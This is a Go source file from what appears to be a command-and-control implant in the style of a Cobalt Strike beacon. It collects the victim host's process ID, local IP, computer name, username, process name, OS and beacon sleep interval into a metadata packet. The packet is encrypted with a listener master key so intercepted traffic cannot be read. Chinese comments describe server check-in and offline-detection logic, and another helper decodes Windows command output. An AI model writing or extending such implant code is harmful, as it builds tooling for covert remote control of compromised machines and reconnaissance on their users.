package utils

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"implant/core/config"
	"implant/core/encrypt"
	"implant/core/sysinfo"
	"io/ioutil"
	"runtime"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

func EncryptedMetaInfo() ([]byte, error) {
	packetUnencrypted := MakeMetaInfo()
	// 【加密体系改造】MetaInfo 用监听器主密钥 AES-GCM 加密（原 AES-CFB 密钥前置明文，截获即解密）
	packetEncrypted, err := encrypt.EncryptWithMasterKey(packetUnencrypted)
	if err != nil {
		return nil, err
	}
	return packetEncrypted, nil
}

/*
MetaData for 4.1

	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
*/
/*
	PID(4) | Flag(1) | IP(4) | OSINFO(
*/
func MakeMetaInfo() []byte {

	processID := sysinfo.GetPID()
	metadataFlag := sysinfo.GetMetaDataFlag()
	processName := sysinfo.GetProcessName()
	localIP := sysinfo.GetLocalIPInt()
	hostName := sysinfo.GetComputerName()
	currentUser, _ := sysinfo.GetUsername()

	processIDBytes := make([]byte, 4)
	flagBytes := make([]byte, 1)
	localIPBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
	flagBytes[0] = byte(metadataFlag)
	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))

	// 【统一心跳】OSInfo 追加第 5 个 \t 字段上报 beacon sleep 秒数（CS 模型单一事实来源）：
	// 服务端 FirstBlood 据此注册离线检测器阈值（旧服务端忽略多余字段，双向兼容；
	// 旧客户端无此字段时服务端回退监听器配置）
	osInfo := fmt.Sprintf("%s\t%s\t%s\t%s\t%d", hostName, currentUser, processName, osTypeName(), config.SleepSeconds())
	if len(osInfo) > 80 {
		osInfo = osInfo[:80]
	}
	osInfoBytes := []byte(osInfo)

	onlineInfoBytes := BytesCombine(processIDBytes, flagBytes, localIPBytes, osInfoBytes)

	return onlineInfoBytes
}
func ReadInt(b []byte) uint32 {
	return binary.BigEndian.Uint32(b)
}
func WriteInt(nInt int) []byte {
	bBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(bBytes, uint32(nInt))
	return bBytes
}
func CodepageToUTF8(b []byte) ([]byte, error) {
	// 强化的编码转换逻辑 - 确保在Windows环境下正确处理中文输出
	if runtime.GOOS != "windows" {
		// 非Windows系统，假设已经是UTF-8
		return b, nil
	}

	// 首先检查输入是否已经是有效的UTF-8
	if utf8.Valid(b) {
		// 如果已经是有效UTF-8，直接返回（避免对WMI等Go内部生成的UTF-8字符串进行错误转换）
		return b, nil
	}

	// 只有当数据不是有效UTF-8时，才尝试从GBK转换
	// 这通常是CMD命令输出的情况
	reader := transform.NewReader(bytes.NewReader(b), simplifiedchinese.GBK.NewDecoder())
	utf8Data, err := ioutil.ReadAll(reader)
	if err != nil {
		// 如果GBK转换失败，尝试GB18030
		reader = transform.NewReader(bytes.NewReader(b), simplifiedchinese.GB18030.NewDecoder())
		if utf8Data2, err2 := ioutil.ReadAll(reader); err2 == nil && utf8.Valid(utf8Data2) {
			return utf8Data2, nil
		}
		// 所有转换失败，返回原始数据
		return b, nil
	}

	// 验证转换结果是否为有效UTF-8
	if utf8.Valid(utf8Data) {
		return utf8Data, nil
	}

	// 转换结果无效，返回原始数据
	return b, nil
}
